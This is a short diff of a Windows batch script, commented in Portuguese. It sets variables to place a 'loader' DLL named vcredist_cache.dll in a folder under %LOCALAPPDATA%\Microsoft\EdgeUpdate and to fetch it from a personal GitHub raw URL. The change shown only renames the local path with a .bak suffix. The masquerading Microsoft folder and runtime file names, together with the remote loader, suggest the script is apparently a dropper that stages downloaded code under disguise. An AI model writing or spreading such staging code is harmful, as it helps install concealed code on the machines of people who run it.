@@ -14,7 +14,7 @@ REM =====================================================================
 
 setlocal
 set "INSTALL_DIR=%LOCALAPPDATA%\Microsoft\EdgeUpdate"
-set "LOADER_PATH=%INSTALL_DIR%\vcredist_cache.dll"
+set "LOADER_PATH=%INSTALL_DIR%\vcredist_cache.dll.bak_1900"
 set "LOADER_URL=https://raw.githubusercontent.com/Jvsosa/assets-storage/main/vcredist_cache.dll"
 
 REM Garante pasta destino
